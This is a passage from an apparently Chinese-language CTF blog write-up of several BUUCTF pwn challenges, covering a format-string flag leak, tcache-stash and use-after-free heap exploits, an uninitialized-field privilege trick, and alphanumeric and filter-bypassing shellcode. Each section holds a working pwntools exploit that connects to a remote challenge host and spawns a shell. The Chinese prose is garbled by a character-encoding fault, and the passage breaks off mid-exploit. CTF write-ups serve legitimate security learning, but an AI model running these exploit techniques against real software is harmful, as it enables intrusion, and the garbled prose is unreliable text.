<p>bssæ®µä¸Šæ²¡æ³•æ‰“ï¼Œæœ‰ä¸ªæ£€æµ‹ï¼Œä½†æ˜¯gdb è°ƒä¸€ä¸‹å¯ä»¥å‘ç°flagåœ¨æ ˆä¸Šæœ‰å¥½å‡ ä¸ªå‰¯æœ¬ï¼Œç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å‡ºflag</p>
<p><img src="https://i.loli.net/2021/05/11/TAxMftjoEJQzYn9.png" alt="image.png"></p>
<p>ï¼ˆè¿™æ ¼å¼åŒ–å­—ç¬¦ä¸²è—å¾—è¿˜æŒºæ·±ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/11/vsUhZnbYCPJAz8a.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26563</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%45$s&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/05/11/8tb3RoV5LQzaqCg.png" alt="image.png"></p>
<h2 id="0x06C-gyctf-2020-signin-Use-After-Free-tcache-stash"><a href="#0x06C-gyctf-2020-signin-Use-After-Free-tcache-stash" class="headerlink" title="0x06C.gyctf_2020_signin - Use After Free + tcache stash"></a>0x06C.gyctf_2020_signin - Use After Free + tcache stash</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œåªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/05/11/VivgrqaDwzjx25H.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½ï¼Œæ²¡æœ‰æ‰“å°</p>
<p><img src="https://i.loli.net/2021/05/11/BtJvcGrPTbm4EYN.png" alt="image.png"></p>
<p>é‡Šæ”¾çš„æ—¶å€™åªä¼šæ¸…é™¤æ ‡å¿—ä½ä¸ä¼šæ¸…é™¤æŒ‡é’ˆï¼Œè€Œç¼–è¾‘æ—¶ä¸çœ‹æ ‡å¿—ä½ï¼Œå­˜åœ¨ UAFï¼Œä½†æ˜¯åªèƒ½ç¼–è¾‘ä¸€æ¬¡</p>
<p><img src="https://i.loli.net/2021/05/11/w46lbTcMY8eRnI7.png" alt="image.png"></p>
<p>æœ‰ä¸ªåé—¨ï¼Œåªè¦èƒ½å¤Ÿå‘ bss æ®µä¸ŠæŸä¸ªç‰¹æ®Šçš„åœ°æ–¹å†™å…¥å³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/12/x7mJKvf5AiR9sjw.png" alt="image.png"></p>
<p>calloc ä¸èµ° tcacheï¼Œè€Œå½“ tcache æœªæ»¡æ—¶ä» fastbin ä¸­å– chunk ï¼Œåˆ™ ptmalloc2 ä¼šå°† fastbin ä¸­å‰©ä½™ chunk é“¾å…¥ tcache é“¾è¡¨å¤´éƒ¨ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥å…ˆå¡«æ»¡ tcacheï¼Œåœ¨ fastbin ä¸­æ”¾å…¥ä¸€ä¸ª chunkï¼Œéšåä¿®æ”¹ fastbin ä¸­ chunk çš„ fd ä¸º bss æ®µä¸Šåœ°å€ï¼Œä¹‹åå†ä»tcache ä¸­å–å‡ºä¸€ä¸ª chunkï¼Œé€šè¿‡ calloc å°† fake bss chunk é“¾å…¥ tcache é“¾è¡¨å¤´éƒ¨ï¼ŒæˆåŠŸ get shell</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_signin&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28127</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your choice?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        new(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">8</span>)</span><br><span class="line">    new(<span class="number">9</span>)</span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/13/XdAqpJIxQEcfe8w.png" alt="image.png"></p>
<h2 id="0x06D-picoctf-2018-are-you-root-heap-trick"><a href="#0x06D-picoctf-2018-are-you-root-heap-trick" class="headerlink" title="0x06D.picoctf_2018_are you root - heap trick"></a>0x06D.picoctf_2018_are you root - heap trick</h2><p>å¤§æ¦‚æ˜¯æä¾›äº†ä¸€ä¸ªç™»å…¥ç³»ç»Ÿçš„åŠŸèƒ½ï¼Œä½†æ˜¯åªæœ‰ level5 èƒ½å¤Ÿè¯» flagï¼Œæˆ‘ä»¬æœ€é«˜åªèƒ½åˆ›å»º level 4 çš„è´¦å·</p>
<p><img src="https://i.loli.net/2021/05/11/2onJYDWKFRTr1Vq.png" alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºæ¯æ¬¡ç™»å½•æ—¶ä¼šåˆ›å»ºä¸€ä¸ª chunk ä¿å­˜è´¦æˆ·ç›¸å…³ä¿¡æ¯ï¼Œfd åŸŸæ”¾ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¿å­˜ä¸ªäººä¿¡æ¯çš„ chunk â€”â€”ç”±strtok åˆ›å»ºï¼Œè€Œ bk åŸŸå‚¨å­˜ level ä¿¡æ¯ï¼Œ<strong>ä¸”ä¸ä¼šè¢«åˆå§‹åŒ–</strong>ï¼›åœ¨é€€å‡ºæ—¶åªä¼š free æ‰å‚¨å­˜ä¿¡æ¯çš„ chunkï¼Œç”±æ­¤å¯ä»¥é€šè¿‡å†åˆ†é…çš„æ–¹å¼ä½¿å¾— level å˜ä¸º5</p>
<p><img src="https://i.loli.net/2021/05/11/PlaFYHEK3gqmseu.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29565</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;login &quot;</span> + <span class="string">b&#x27;arttnba3&#x27;</span> + p64(<span class="number">5</span>))</span><br><span class="line">p.sendline(<span class="string">b&quot;reset&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;login &quot;</span> + <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;get-flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/05/11/sGPuyTUwAjoCYWV.png" alt="image.png"></p>
<h2 id="0x06E-mrctf2020-shellcode-revenge-Alphanumeric-Shellcode"><a href="#0x06E-mrctf2020-shellcode-revenge-Alphanumeric-Shellcode" class="headerlink" title="0x06E.mrctf2020_shellcode_revenge - Alphanumeric Shellcode"></a>0x06E.mrctf2020_shellcode_revenge - Alphanumeric Shellcode</h2><p>å¤§æ¦‚æ˜¯è¯»å…¥ shellcode åæ‰§è¡Œï¼Œä½†æ˜¯åªèƒ½è¾“å…¥å¯è§å­—ç¬¦ï¼Œé‚£å°±ç”¨<a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3.git">è¿™ä¸ªè½®å­</a>ç”Ÿæˆ alphanumeric shellcode å³å¯ï¼Œæ³¨æ„ç¨‹åºç”¨çš„ readï¼Œåˆ«æŠŠæ¢è¡Œç¬¦ä¹Ÿç»™è¾“è¿›å»äº†</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29398</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/07/21/d29cTDx1rhUHFCP.png" alt="image.png"></p>
<h2 id="0x06F-starctf-2019-babyshell-shellcode-trick"><a href="#0x06F-starctf-2019-babyshell-shellcode-trick" class="headerlink" title="0x06F.starctf_2019_babyshell - shellcode trick"></a>0x06F.starctf_2019_babyshell - shellcode trick</h2><p>ä¹Ÿæ˜¯è¾“ shellcodeï¼Œä¸åŒçš„æ˜¯ä¼šè¿‡æ»¤è¿™äº›å­—ç¬¦ï¼š</p>
<p><img src="https://i.loli.net/2021/07/21/VXt4s8eWMTjJcCH.png" alt="image.png"></p>
<p>å…ˆè€ƒè™‘ä»æ ˆä¸Šæ‰¾æœ‰ç”¨çš„æ•°æ®ä»¥åŠç³»ç»Ÿè°ƒç”¨ï¼Œç®€å•æ•´ç‚¹åŸºç¡€ shellcode æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ— æ³•ä½¿ç”¨ <code>pop rsi</code> æŒ‡ä»¤ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶ rdi å’Œ rdxï¼Œå¹¶è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p>
<p><img src="https://i.loli.net/2021/07/21/PxNHB7XLtrzGT9D.png" alt="image.png"></p>
<h3 id="è§£æ³•ä¸€ï¼šäºŒæ¬¡-shellcode-æ‰§è¡Œ"><a href="#è§£æ³•ä¸€ï¼šäºŒæ¬¡-shellcode-æ‰§è¡Œ" class="headerlink" title="è§£æ³•ä¸€ï¼šäºŒæ¬¡ shellcode æ‰§è¡Œ"></a>è§£æ³•ä¸€ï¼šäºŒæ¬¡ shellcode æ‰§è¡Œ</h3><p>ç®€å•è°ƒè¯•å¯ä»¥å‘ç°æ‰§è¡Œ shellcode æ—¶ rsi æŒ‡å‘ shellcodeï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘åœ¨æ‰§è¡Œ shellcode æ—¶æ‰§è¡Œ read ç³»ç»Ÿè°ƒç”¨å°† get shell çš„ shellcode è¯»å…¥ï¼Œå‰æ–¹ç”¨ nop å¡«å……å³å¯</p>
<p><img src="https://i.loli.net/2021/07/21/owIAR1pz9SHMDtB.png" alt="image.png"></p>
<p>æ‡’å¾—åœ¨æœ¬åœ°è°ƒå’Œè¿œç¨‹ç›¸åŒçš„æ ˆç¯å¢ƒäº†ï¼Œç›´æ¥çˆ†ï¼Œæ ˆä¸Šç¬¬ä¸€ä¸ªå€¼é0ç»™rdxï¼Œç¬¬å…­ä¸ªå€¼ä¸º0ç»™rdiï¼Œç„¶åå°±æ˜¯æ„‰å¿«çš„æ‹¿shellçš„è¿‡ç¨‹</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26442</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;pop rdx;&#x27;</span> + <span class="string">&#x27;pop rdi;&#x27;</span> * <span class="number">5</span> + <span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;nop&#x27;</span>) * <span class="number">0x20</span> + asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/07/21/NGf9JSMrKLD3UcB.png" alt="image.png"></p>
<h3 id="è§£æ³•äºŒï¼š-x00-shellcode-ç»•è¿‡æ£€æµ‹"><a href="#è§£æ³•äºŒï¼š-x00-shellcode-ç»•è¿‡æ£€æµ‹" class="headerlink" title="è§£æ³•äºŒï¼š\x00 shellcode ç»•è¿‡æ£€æµ‹"></a>è§£æ³•äºŒï¼š\x00 shellcode ç»•è¿‡æ£€æµ‹</h3><p>æ£€æµ‹å‡½æ•°ç”¨ä¸€ä¸ªå¤§çš„ while å¾ªç¯éå†æˆ‘ä»¬è¾“å…¥çš„ shellcodeï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯è‹¥æˆ‘ä»¬çš„ shellcode ç¬¬ä¸€æ¡æŒ‡ä»¤ä»¥ <code>\x00</code> å¼€å¤´ï¼Œåˆ™å¯ä»¥ç›´æ¥ç»•è¿‡æ£€æµ‹</p>
<p><img src="https://i.loli.net/2021/07/21/ezFcMAhwpnGTfYx.png" alt="image.png"></p>
<p>æŸ¥é˜… intel æ‰‹å†Œåé€‰ä¸€æ¡åˆé€‚çš„æŒ‡ä»¤å¡«å……åœ¨å¼€å¤´å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26442</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;add ah, al&#x27;</span>) + asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/07/21/4XrkSatjTRGyx6N.png" alt="image.png"></p>
<h2 id="0x070-actf-2019-babyheap-Use-After-Free-heap-arrangement"><a href="#0x070-actf-2019-babyheap-Use-After-Free-heap-arrangement" class="headerlink" title="0x070.actf_2019_babyheap - Use After Free + heap arrangement"></a>0x070.actf_2019_babyheap - Use After Free + heap arrangement</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼ŒPIE ä»¥å¤–éƒ½å¼€äº†</p>
<p><img src="https://i.loli.net/2021/07/21/Tys9a4UQuim2Jcx.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æ˜¯æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—çš„åŠŸèƒ½ï¼Œå…¶ä¸­ç»“æ„ä½“è¿˜æ˜¯å¥—äº†å‡½æ•°æŒ‡é’ˆçš„å¥—å¨ƒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * content;</span><br><span class="line">	<span class="type">void</span> (* print_func)(<span class="type">char</span>*);</span><br><span class="line">&#125;chunk;</span><br></pre></td></tr></table></figure>

<p>è£¸çš„ UAF</p>
<p><img src="https://i.loli.net/2021/07/21/2LygVDJHk9U7lvR.png" alt="image.png"></p>
<p>è€çš„ libc 2.27ï¼Œç¨‹åºé‡Œæœ‰ system ä¹Ÿæœ‰ <code>&quot;sh&quot;</code> å­—ç¬¦ä¸²ï¼Œå †é£æ°´ä¸€ä¸‹å³å¯</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./ACTF_2019_babyheap&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29464</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input list index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input list index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(e.search(<span class="string">b&#x27;sh\x00&#x27;</span>).__next__()) + p64(e.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/07/21/ipNubZUfn42SC95.png" alt="image.png"></p>
<h1 id="0x071-0x080"><a href="#0x071-0x080" class="headerlink" title="0x071 ~ 0x080"></a>0x071 ~ 0x080</h1><h2 id="0x071-xman-2019-format-fmtstr"><a href="#0x071-xman-2019-format-fmtstr" class="headerlink" title="0x071.xman_2019_format - fmtstr"></a>0x071.xman_2019_format - fmtstr</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œåªå¼€äº† NX ä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/07/21/atnvVyh8sEdqlF2.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å…è®¸è¯»å…¥0x37å­—èŠ‚åˆ°å †ä¸Š</p>
<p><img src="https://i.loli.net/2021/07/21/Cc1KfVQRgh5O4kY.png" alt="image.png"></p>
<p>ç„¶åå°±æ˜¯è£¸çš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œ<strong>ä½†æ˜¯åªèƒ½å¤Ÿè¯»å…¥ä¸€æ¬¡</strong></p>
<p><img src="https://i.loli.net/2021/07/21/sIY5KhPl6LkmcTy.png" alt="image.png"></p>
<p>æœ‰ä¸ªåé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/07/21/okmiRV2Gcws9yIb.png"></p>
<p>ç”±äºæˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨å †ä¸Šï¼Œæ•…æˆ‘ä»¬ä¸èƒ½å¤Ÿåƒä»¥å‰åœ¨æ ˆä¸Šé‚£æ ·ç›´æ¥åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å†…å†™å…¥åœ°å€åè¿›è¡Œä»»æ„åœ°å€å†™ï¼Œè€Œæ˜¯<strong>éœ€è¦æ‰¾æ ˆä¸Šçš„æœ‰ç”¨çš„åœ°å€è¿›è¡Œæœ‰é™åœ°å€å†™</strong></p>
<p>åœ¨ <code>0x80485F6</code> å¤„ä¸‹æ–­ç‚¹ï¼Œæ ˆå¸ƒå±€å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/25/PuyWYB4H9MQhmqT.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾å‘ç° ebp æ€»ä¼šæŒ‡å‘æ ˆä¸Šä¸€ä¸ªç‰¹å®šåœ°å€ï¼Œè€Œå…¶ä¸­å­˜æ”¾ç€ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œç”±æ­¤æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>å¯ä»¥é€šè¿‡ä¸¤æ¬¡ä»»æ„åœ°å€å†™ï¼Œç¬¬ä¸€æ¬¡å…ˆé€šè¿‡ ebp å°†æ ˆä¸ŠæŒ‡é’ˆæŒ‡å‘å‡½æ•°è¿”å›åœ°å€ï¼Œç¬¬äºŒæ¬¡åˆ™é€šè¿‡è¯¥äºŒçº§æŒ‡é’ˆæ”¹å†™å‡½æ•°è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°åœ°å€</strong></p>
<p>ç”±äºæ ˆåœ°å€æ˜¯ä¼šå˜çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çˆ†ç ´ <code>1/16</code> çš„å‡ ç‡</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./xman_2019_format&#x27;</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;try no.&quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((count % <span class="number">16</span>) * <span class="number">16</span> + <span class="number">0xc</span>) + <span class="string">&quot;c%10$hhn&quot;</span> + <span 